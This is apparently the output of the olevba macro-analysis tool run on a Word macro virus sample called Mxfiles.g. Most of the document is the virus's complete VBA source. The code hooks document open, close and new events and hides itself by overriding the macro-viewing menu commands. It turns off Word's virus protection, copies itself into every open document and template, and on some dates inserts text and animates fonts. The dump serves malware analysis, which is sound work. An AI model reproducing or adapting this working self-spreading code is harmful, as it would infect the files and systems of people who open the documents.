olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.g-c69e69d432a1c556436ae39bbefb90e30794efbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.g-c69e69d432a1c556436ae39bbefb90e30794efbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO abc.bas 
in file: Virus.MSWord.Mxfiles.g-c69e69d432a1c556436ae39bbefb90e30794efbc - OLE stream: 'Macros/VBA/abc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
mxf
End Sub
Sub filetemplates()
mxf
End Sub
Sub Autoexit()
mxf
End Sub
Sub Autoexec()
mxf
End Sub
Sub Autonew()
mxf
End Sub
Sub Autoopen()
mxf
End Sub
Sub Autoclose()
mxf
End Sub
Sub Openshell()
mxf
End Sub
Sub viewvbcode()
mxf
End Sub
Sub mxf()
On Error Resume Next
Dim counts As Integer
Dim stri As String
Dim docpath As String
Dim dayn As Integer
Dim monthn As Integer
Dim org As String
Dim dest As String
Dim reg As String
Dim dur As String
Dim min As String
Dim kind As Variant
Dim namem As String
Dim strin As String
Randomize Timer
namem = "abc"
strin = "ÈÓã Çááå ÇáÑÍãä ÇáÑÍíã"
Application.UserName = "Sosta"
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
org = ThisDocument.FullName
For counts = 1 To Documents.Count
DoEvents
If Documents.Item(counts).Path <> "" Then
dest = Documents.Item(counts).FullName
Else
dest = Documents.Item(counts).Name
End If
Application.OrganizerDelete Source:=dest, Name:="mxfile", Object:=wdOrganizerObjectProjectItems
If org <> dest Then
Application.OrganizerCopy Source:=org, Destination:=dest, Name:=namem, Object:=wdOrganizerObjectProjectItems
End If
docpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\" + Documents.Item(counts).AttachedTemplate
DoEvents
SetAttr docpath, vbNormal
Application.OrganizerDelete Source:=docpath, Name:="mxfile", Object:=wdOrganizerObjectProjectItems
If org <> docpath Then
Application.OrganizerCopy Source:=org, Destination:=docpath, Name:=namem, Object:=wdOrganizerObjectProjectItems
End If
Next counts
stri = GetSetting(appname:="Microsoft", Section:="Office", Key:=namem)
dayn = Format(Date, "dd")
monthn = Format(Date, "mm")
reg = dayn Mod monthn
If reg = 0 And dayn > 10 And Val(stri) <> 1669 Then
Selection.WholeStory
If InStr(Selection, strin) = 0 Then
Selection.HomeKey Unit:=wdStory
Selection.TypeText Text:=strin
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.TypeParagraph
End If
Selection.WholeStory
kind = Selection.Font.Animation
min = LTrim(Str$(Int((6 * Rnd) + 1)))
Select Case kind
Case wdAnimationNone:
Selection.Font.Animation = min
dur = "00:00:30"
Case Else
Selection.Font.Animation = wdAnimationNone
dur = "00:0" + min
End Select
Selection.MoveUp Unit:=wdLine, Count:=1
ActiveDocument.UndoClear
Application.ScreenUpdating = True
End If
If dur = "" Then dur = "00:10"
Application.ScreenUpdating = True
Application.OnTime When:=Now + TimeValue(dur), Name:="mxf"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
